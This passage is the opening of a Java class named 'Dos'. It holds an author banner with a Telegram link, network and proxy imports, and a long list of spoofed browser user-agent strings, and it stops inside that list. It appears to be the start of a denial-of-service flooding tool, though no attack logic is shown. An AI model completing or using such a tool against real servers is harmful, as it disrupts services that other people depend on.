//RENAME TANPA IZIN MATI AJA
//RENAME TANPA IZIN MATI AJA
//RENAME TANPA IZIN MATI AJA
//RENAME TANPA IZIN MATI AJA
//https://t.me/mrd4nd

import java.io.*;
import java.net.*;
import java.net.URL;
import java.net.URL;

import java.util.Scanner;
import java.util.ArrayList;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.Random;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.List;
import javax.net.ssl.HttpsURLConnection;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.net.ssl.HttpsURLConnection;

public class Dos implements Runnable {

    String[] userAgents = {
		"Mozilla/5.0 (Linux; Android 5.1; OPPO F1s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; RMX3501) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; RMX3624 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.3.0.1",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; RMX1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/10.4.2.0",
		"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/10.4.2.0",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; 22120RN86G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; 22120RN86G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; CPH2365) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A047F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 12; in-id; CPH2477 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.9.5.1.1",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; V2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 12; in-id; CPH2477 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.8.9.9",
		"Mozilla/5.0 (Linux; Android 12; V2120) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-A037F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.1.0.0",
		"Mozilla/5.0 (Linux; U; Android 11; id-id; Redmi 10C Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 11; id-id; Redmi 10C Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn",
		"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A145F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/15.9.5.1.1",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 12; in-id; CPH2477 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.8.9.9",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; Infinix X680) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 11; id-id; Redmi 10 2022 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.13.2-gn",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; SOV37) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 11; id-id; Redmi Note 9 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.30.0-gn",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; CPH1605 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; JAT-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.0 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/217.0.454508427 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5115.170 Safari/537.36 Edg/101.0.1202.50",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/105.0.1296.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.178 Safari/537.36 Edg/98.0.1108.50",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5111.0 Safari/537.36 Edg/104.0.1290.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.196 Safari/537.36 Edg/95.0.1020.30",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/98.0.1108.62",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/104.0.1293.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.32",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/104.0.1293.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Edg/102.0.1245.44",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5098.136 Safari/537.36 Edg/99.0.1208.24",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.71",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4; rv:107.0) Gecko/20110101 Firefox/107.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1; rv:106.0) Gecko/20000101 Firefox/106.0",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:106.0) Gecko/20012209 Firefox/106.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20110101 Firefox/100.0",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20061419 Firefox/100.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:100.0) Gecko/20100101 Firefox/100.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:100.0) Gecko/20000101 Firefox/100.0",
		"Mozilla/5.0 (X11; Linux x86_64) Gecko/20162914 Firefox/100.0",
		"Mozilla/5.0 (Macintosh; PPC Mac OS X x.y; rv:100.0) Gecko/20100101 Firefox/100.0",
		"Mozilla/5.0 (Linux; Android 11; Mobile; rv: 100.0) Gecko/100.0 FireFox/100.0",
		"Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20000604 Firefox/100.0",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20071101 Firefox/100.0",
		"Mozilla/5.0 (X11; Linux x86_64:100.0) Gecko/20100101 Firefox/100.0",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:100.0) Gecko/20012119 Firefox/100.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.91 Safari/537.36 OPR/44.0.2276.288",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4126.146 Safari/537.36 OPR/54.0.4177.46",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.4123.146 Safari/537.36 OPR/53.0.4054.46",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4892.119 Safari/537.36 OPR/85.0.4341.72",
		"Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5150.115 Safari/537.36 OPR/80.0.3637.162",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4870.168 Safari/537.36 OPR/78.0.3351.71",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36 OPR/85.0.4341.18",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.5126.171 Safari/537.36 OPR/79.0.2378.171",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5041.151 Safari/537.36 OPR/82.0.4117.142",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.58",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4930.0 Safari/537.36 OPR/83.0.4254.27",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/102.0.5005.61 Safari/537.36 OPR/88.0.4412.27",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4862.113 Safari/537.36 OPR/85.0.4341.60",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15 [ip:87.10.225.10]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.163.73]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.205.123]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.182.120]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.216.36]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.209.127]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:82.51.25.66]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.183.139]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.204.153]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.211.83]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:87.18.55.5]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:87.6.61.173]",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.202.253]",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
		"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
		"Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15H321 Safari/604.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.41",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.8.26",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400518001",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400518001",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.391216004",
		"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400511001",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
		"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 NewsSapphire/1.0.400420001",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400511001",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 GLS/93.10.1819.20",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 OpenWave/96.4.1823.24",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5022.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5022.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14927.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; STK-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-S767VL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; KFMAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14917.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5116.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5118.3 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14885.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5117.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5116.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5115.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5114.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4896.127 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5022.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4844.51 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4844.51 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A305G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G930F/G930FXXU5ESD2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; fr-fr; SAMSUNG SM-T520 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/82.0.140 Chrome/76.0.3809.140 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/82.0.140 Chrome/76.0.3809.140 Safari/537.36",
